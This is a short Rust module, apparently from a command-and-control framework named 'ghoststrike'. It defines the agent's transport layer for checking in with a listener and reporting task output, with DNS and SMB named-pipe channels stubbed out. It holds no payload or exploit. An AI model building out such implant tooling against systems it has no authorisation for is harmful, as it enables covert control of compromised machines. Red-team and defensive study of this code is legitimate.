mod http;

use anyhow::Result;
use uuid::Uuid;
use ghoststrike_common::{AgentCheckinReq, AgentCheckinResp, ListenerProtocol, Task, TaskResultReq};
use crate::config::AgentConfig;

pub struct Transport {
    inner: Box<dyn TransportInner + Send + Sync>,
}

#[async_trait::async_trait]
trait TransportInner {
    async fn checkin(&self, req: &AgentCheckinReq) -> Result<AgentCheckinResp>;
    async fn report_task(&self, agent_id: Uuid, task: &Task, output: String) -> Result<()>;
}

impl Transport {
    pub fn new(cfg: &AgentConfig) -> Result<Self> {
        let inner: Box<dyn TransportInner + Send + Sync> = match cfg.protocol {
            ListenerProtocol::Http | ListenerProtocol::Https => {
                Box::new(http::HttpTransport::new(cfg)?)
            }
            ListenerProtocol::Dns => {
                // DNS transport — Phase 2 full implementation.
                Box::new(http::HttpTransport::new(cfg)?) // fallback for now
            }
            ListenerProtocol::Smb => {
                // SMB named-pipe transport — Phase 2.
                Box::new(http::HttpTransport::new(cfg)?) // fallback for now
            }
        };
        Ok(Self { inner })
    }

    pub async fn checkin(&self, req: &AgentCheckinReq) -> Result<AgentCheckinResp> {
        self.inner.checkin(req).await
    }

    pub async fn report_task(&self, agent_id: Uuid, task: &Task, output: String) -> Result<()> {
        self.inner.report_task(agent_id, task, output).await
    }
}
